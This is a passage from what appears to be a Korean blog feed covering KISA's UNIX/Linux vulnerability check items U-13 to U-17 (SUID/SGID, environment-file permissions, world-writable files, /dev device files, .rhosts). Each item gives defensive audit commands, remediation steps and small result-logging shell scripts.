<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-12/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-13 SUID, SGID 설정 파일점검</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-13%20SUID,%20SGID%20%EC%84%A4%EC%A0%95%20%ED%8C%8C%EC%9D%BC%EC%A0%90%EA%B2%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>불필요하거나 악의적인 파일에 <code>SUID</code> <code>SGID</code> 설정 여부 점검</p>
<p>항목코드는 <code>U-13</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p> 불필요한 <code>SUID</code> <code>SGID</code> 설정 제거로 악의적인 사용자의 권한상승을 방지하기  위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>SUID</code> <code>SGID</code> 파일의 접근권한이 적절하지 않을 경우 <code>SUID</code> <code>SGID</code> 설정된 파 일로 특정 명령어를 실행하여 root 권한 획득 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 주요 실행파일의 권한에 <code>SUID</code>와 <code>SGID</code>에 대한 설정이 부여되어 있지 않은  경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 주요 실행파일의 권한에 <code>SUID</code>와 <code>SGID</code>에 대한 설정이 부여되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>OS별 주요 실행파일에 대한 <code>SUID</code> <code>SGID</code> 설정 여부 확인<br />    `# ls -alL [check_file]</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># find / -user root -type f ( -perm -04000 -o -perm -02000 ) -xdev -exec ls -al {} ; 2&gt;/dev/null</p>
</blockquote>
<br>

<p><code>SUID</code> <code>SGID</code> 설정이 부여된 실행파일 목록을 출력해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-13/find.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 제거 방법<br />    <code># chmod -s &lt;file_name&gt;</code><br /><br />2) 주기적인 검사 방법<br />    <code># find / -user root -type f \( -perm -04000 -o -perm -02000 \) -xdev -exec ls -al &#123;&#125; \;</code><br /><br />3) 반드시 사용이 필요한 경우 특정 그룹에서만 사용하도록 제한하는 방법<br />일반 사용자의 <code>Setuid</code> 사용을 제한함<br />    <code># /user/bin/chgrp &lt;group_name&gt; &lt;setuid_file_name&gt;</code><br />    <code># /usr/bin/chmod 4750 &lt;setuid_file_name&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">process=`find / -user root -<span class="built_in">type</span> f \( -perm -04000 -o -perm -02000 \) -xdev -<span class="built_in">exec</span> ls -al &#123;&#125; \; 2&gt;/dev/null`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$process</span>&quot;</span> &gt; /root/result/u-13.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-13 [SUID, SGID 설정 파일점검] : /root/result/u-13.txt 파일 확인</span><br></pre></td></tr></table></figure>

<br>

<p><code>SUID</code> <code>SGID</code> 설정이 부여된 실행파일 목록 결과를 <code>/root/result/u-13.txt</code> 파일에 입력해주었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-13/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-14 사용자, 시스템 시작파일 및 환경파일 소유자 및 권한 설정</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-14%20%EC%82%AC%EC%9A%A9%EC%9E%90,%20%EC%8B%9C%EC%8A%A4%ED%85%9C%20%EC%8B%9C%EC%9E%91%ED%8C%8C%EC%9D%BC%20%EB%B0%8F%20%ED%99%98%EA%B2%BD%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>홈 디렉터리 내의 환경변수 파일에 대한 소유자 및 접근권한이 관리자 또는 해당 계정으로 설정되어 있는지 점검합니다.</p>
<p>항목코드는 <code>U-14</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>비인가자의 환경변수 조작으로 인한 보안 위험을 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>홈 디렉터리 내의 사용자 파일 및 사용자별 시스템 시작파일 등과 같은 환 경변수 파일의 접근권한 설정이 적절하지 않을 경우 비인가자가 환경변수  파일을 변조하여 정상 사용중인 사용자의 서비스가 제한 될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 홈 디렉터리 환경변수 파일 소유자가 root 또는 해당 계정으로 지정되 어 있고 홈 디렉터리 환경변수 파일에 root와 소유자만 쓰기 권한이 부여 된 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 홈 디렉터리 환경변수 파일 소유자가 root 또는 해당 계정으로 지정되 지 않고 홈 디렉터리 환경변수 파일에 root와 소유자 외에 쓰기 권한이  부여된 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>홈 디렉터리 환경변수 파일의 소유자 및 권한 확인<br />    <code># ls -l &lt;홈 디렉터리 환경변수 파일&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -al /root/</p>
</blockquote>
<br>

<p>홈 디렉터리 환경변수 파일의 소유자가 root 인지, root 소유자만 쓰기 권한이 부여되어있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-14/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 소유자 변경 방법<br />    <code># chown &lt;user_name&gt; &lt;file_name&gt;</code><br /><br />2) 일반 사용자 쓰기 권한 제거 방법<br />    <code># chmod o-w &lt;file_name&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">process=`ls -al /root/`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$process</span>&quot;</span> &gt; /root/result/u-14.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-14 [사용자, 시스템 시작파일 및 환경파일 소유자 및 권한 설정] : /root/result/u-14.txt 파일 확인</span><br></pre></td></tr></table></figure>

<br>

<p>홈디렉터리에 있는 파일들의 소유자와 권한을 <code>/root/result/u-14.txt</code> 파일에 입력해주었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-14/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-15 world writable 파일 점검</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-15%20world%20writable%20%ED%8C%8C%EC%9D%BC%20%EC%A0%90%EA%B2%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>불필요한 <code>world writable</code> 파일 존재 여부 점검입니다.</p>
<p>항목코드는 <code>U-15</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="world-writable"><a href="#world-writable" class="headerlink" title="world writable ?"></a>world writable ?</h2><br>

<p>파일의 내용을 소유자나 그룹 외 모든 사용자에 대해 쓰기가 허용된 파일입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>world writable</code> 파일을 이용한 시스템 접근 및 악의적인 코드 실행을 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>시스템 파일과 같은 중요 파일에 <code>world writable</code> 설정이 될 경우 일반사용자 및 비인가된 사용자가 해당 파일을 임의로 수정, 삭제가 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 시스템 중요 파일에 <code>world writable</code> 파일이 존재하지 않거나 존재 시 설정 이유를 확인하고 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 시스템 중요 파일에 <code>world writable</code> 파일이 존재하나 해당 설정 이유를  확인하고 있지 않는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>world writable</code> 파일 존재 여부 확인<br />    <code># find / -type f -perm -2 -exec ls -l &#123;&#125; \;</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># find / -type f -perm -2 -exec ls -l {} ;</p>
</blockquote>
<br>

<p><code>world writable</code> 파일 존재 여부를 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-15/find.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 일반 사용자 쓰기 권한 제거 방법<br />    <code># chmod o-w &lt;file_name&gt;</code><br /><br />2) 파일 삭제 방법<br />    <code># rm -rf &lt;world-writable 파일명&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">process=`find / -<span class="built_in">type</span> f -perm -2 -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt;/dev/null`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$process</span>&quot;</span> &gt; /root/result/u-15.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-15 [world writable 파일 점검] : /root/result/u-15.txt 파일 확인</span><br></pre></td></tr></table></figure>

<br>

<p><code>world writable</code> 파일 목록들을 <code>/root/result/u-15.txt</code> 파일에 입력해주었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-15/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-16 /dev에 존재하지 않는 device 파일 점검</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-16%20dev%EC%97%90%20%EC%A1%B4%EC%9E%AC%ED%95%98%EC%A7%80%20%EC%95%8A%EB%8A%94%20device%20%ED%8C%8C%EC%9D%BC%20%EC%A0%90%EA%B2%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>존재하지 않는 <code>device</code> 파일 존재 여부 점검입니다.</p>
<p>항목코드는 <code>U-16</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>실제 존재하지 않는 디바이스를 찾아 제거함으로써 root 파일 시스템 손상 및 다운 등의 문제를 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>공격자는 rootkit 설정파일들을 서버 관리자가 쉽게 발견하지 못하도록 <code>/dev</code>에 <code>device</code> 파일인 것처럼 위장하는 수법을 많이 사용합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>/dev</code>에 대한 파일 점검 후 존재하지 않는 <code>device</code> 파일을 제거한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>/dev</code>에 대한 파일 미점검 또는 존재하지 않는 <code>device</code> 파일을 방치한 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/dev</code>에 존재하지 않는 <code>device</code> 파일 점검<br />    <code># find /dev -type f -exec ls -l &#123;&#125; \;</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># find /dev -type f -exec ls -l {} ;</p>
</blockquote>
<br>

<p><code>/dev</code>에 존재하지 않는 <code>device</code> 파일을 점검해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-16/find.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>/dev</code> 디렉터리 파일 점검<br />    <code># find /dev -type f -exec ls -l &#123;&#125; \;</code><br /><br />2) major, minor number를 가지지 않는 <code>device</code>일 경우 삭제</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find /dev -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -l &#123;&#125; \;`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-16 [/dev에 존재하지 않는 device 파일 점검] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-16.txt</span><br></pre></td></tr></table></figure>

<br>

<p>존재하지 않는 디바이스가 <code>/dev</code> 디렉터리 내에 존재하는 경우 <code>취약</code>, 아니면 <code>양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-16</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-16/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-17 $HOME/.rhosts, hosts.equiv 사용 금지</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-17%20$HOME%20.rhosts,%20hosts.equiv%20%EC%82%AC%EC%9A%A9%20%EA%B8%88%EC%A7%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>/etc/hosts.equiv</code> 파일 및 <code>.rhosts</code> 파일 사용자를 root 또는 해당 계정으로 설정한 뒤 권한을 600으로 설정하고 해당파일 설정에 <code>+</code> 설정이 포함되지 않도록 설정되어 있는지 점검합니다.</p>
<p>항목코드는 <code>U-17</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>r command 사용을 통한 원격 접속은 인증 없이 관리자 원격접속이 가능하므로 서비스 포트를 차단해야 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>rlogin</code> <code>rsh</code> 등과 같은 r command의 보안 설정이 적용되지 않은 경우 원격지의 공격자가 관리자 권한으로 목표 시스템상의 임의의 명령을 수행시킬 수 있으며 명령어 원격 실행을 통해 중요 정보 유출 및 시스템 장애를 유발시킬 수 있습니다. 또한 공격자 백도어 등으로도 활용될 수 있습니다.</p>
<p>r command 서비스의 접근통제에 관련된 파일로 권한설정을 미 적용한 경우 r command 서비스 사용 권한을 임의로 등록하여 무단 사용이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>login</code> <code>shell</code> <code>exec</code> 서비스를 사용하지 않거나 사용 시 아래와 같은 설정이 적용된 경우</p>
<ol>
<li> <code>/etc/hosts.equiv</code> 및 <code>$HOME/.rhosts</code> 파일 소유자가 root 또는 해당 계정인 경우</li>
<li><code>/etc/hosts.equiv</code> 및 <code>$HOME/.rhosts</code> 파일 권한이 600 이하인 경우</li>
<li><code>/etc/hosts.equiv</code> 및 <code>$HOME/.rhosts</code> 파일 설정에 <code>+</code> 설정이 없는 경우</li>
</ol>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>login</code> <code>shell</code> <code>exec</code> 서비스를 사용하고 위와 같은 설정이 적용되지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 파일 소유자 및 권한 확인<br />    <code># ls -al /etc/hosts.equiv</code><br />    <code># ls -al $HOME/.rhosts</code><br />    rw------- root &lt;hosts.equiv 파일&gt;<br />    rw------- root &lt;$HOME/.rhosts 파일&gt;<br /><br />2) 계정 별 <code>+</code> 부여 적절성 확인<br />    <code># cat /etc/hosts.equiv</code><br />    <code># cat $HOME/.rhosts</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -al $HOME/.rhosts</p>
</blockquote>
<br>

<p><code>.rhosts</code>의 소유자와 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-17/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>/etc/hosts.equiv</code> 및 <code>$HOME/.rhosts</code> 파일의 소유자를 root 또는 해당 계정으로 변경<br />    <code># chown root /etc/hosts.equiv</code><br />    <code># chown &lt;user_name&gt; $HOME/.rhosts</code><br /><br />2) <code>/etc/hosts.equiv</code> 및 <code>$HOME/.rhosts</code> 파일의 권한을 600 이하로 변경<br />    <code># chmod 600 /etc/hosts.equiv</code><br />    <code># chmod 600 $HOME/.rhosts</code><br /><br />3) <code>/etc/hosts.equiv</code> 및 <code>$HOME/.rhosts</code> 파일에서 <code>+</code>를 제거하고 허용 호스트 및 계정 등록<br />    <code># cat /etc/hosts.equiv</code> (or $HOME/.rhosts)</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

